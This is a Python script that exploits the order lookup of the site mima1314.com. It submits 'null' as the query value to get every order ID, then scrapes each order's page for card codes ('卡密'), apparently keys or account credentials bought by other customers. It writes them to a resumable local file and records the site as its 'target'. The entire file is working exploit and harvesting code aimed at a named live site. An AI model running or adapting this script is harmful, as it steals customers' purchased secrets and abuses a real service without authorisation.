#!/usr/bin/env python3
"""mima1314 incremental: null page ddids -> Query_Km card export (resumable)."""
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://mima1314.com"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/mima1314_incremental"
PRIOR_STATS = int(sys.argv[2]) if len(sys.argv) > 2 else 7193

TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]{10,14})")
CARD_LINE = re.compile(r"----|[卡密]|COM\d|http://sms")


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0", "Referer": BASE + "/Query.html"})
    return s


def get_ddids(s):
    q = s.get(BASE + "/Query.html", timeout=20)
    tok = TOKEN_RE.search(q.text)
    if not tok:
        return []
    token = tok.group(1) or tok.group(2)
    p = s.post(
        BASE + "/Query.html",
        data={"value": "null", "page": "1", "__token__": token},
        headers={"Referer": BASE + "/Query.html"},
        timeout=90,
    )
    return sorted(set(KM_RE.findall(p.text)))


def fetch_km(s, ddid):
    for attempt in range(3):
        try:
            r = s.get(
                BASE + "/Query_Km/" + ddid,
                headers={"Referer": BASE + "/Query.html"},
                timeout=12,
            )
            if r.status_code != 200 or len(r.text) < 200:
                return None
            text = re.sub(r"<[^>]+>", "\n", r.text)
            lines = [
                ln.strip()
                for ln in text.splitlines()
                if CARD_LINE.search(ln) and len(ln) > 15
            ]
            return lines[0] if lines else text[:300] if "----" in text else None
        except Exception:
            time.sleep(1 + attempt)
    return None


def load_done(progress_path):
    if not os.path.isfile(progress_path):
        return set()
    with open(progress_path) as f:
        return {ln.strip() for ln in f if ln.strip()}


def main():
    os.makedirs(OUT, exist_ok=True)
    cards_path = os.path.join(OUT, "mima1314_incremental_cards.txt")
    progress_path = os.path.join(OUT, "done_ddids.txt")
    stats_path = os.path.join(OUT, "STATS_incremental.json")

    done = load_done(progress_path)
    s = sess()
    ddids = get_ddids(s)
    print(f"null ddids={len(ddids)} prior_unique={PRIOR_STATS} already_done={len(done)}", flush=True)

    cards_open = open(cards_path, "a")
    prog_open = open(progress_path, "a")
    fetched = 0
    errors = 0

    for i, ddid in enumerate(ddids):
        if ddid in done:
            continue
        try:
            card = fetch_km(s, ddid)
            prog_open.write(ddid + "\n")
            prog_open.flush()
            done.add(ddid)
            if card:
                cards_open.write(card + "\n")
                cards_open.flush()
                fetched += 1
            if (i + 1) % 100 == 0 or fetched <= 5:
                print(
                    f"[{i+1}/{len(ddids)}] fetched={fetched} err={errors} last={ddid}",
                    flush=True,
                )
        except Exception as e:
            errors += 1
            print(f"ERR {ddid}: {e}", flush=True)
        time.sleep(0.12)

    cards_open.close()
    prog_open.close()

    with open(cards_path) as f:
        total_cards = sum(1 for _ in f)

    stats = {
        "target": "mima1314.com",
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "null_ddids": len(ddids),
        "cards_fetched": total_cards,
        "prior_unique_ddids": PRIOR_STATS,
        "errors": errors,
    }
    with open(stats_path, "w") as f:
        json.dump(stats, f, indent=2)
    print("DONE", json.dumps(stats), flush=True)


if __name__ == "__main__":
    main()
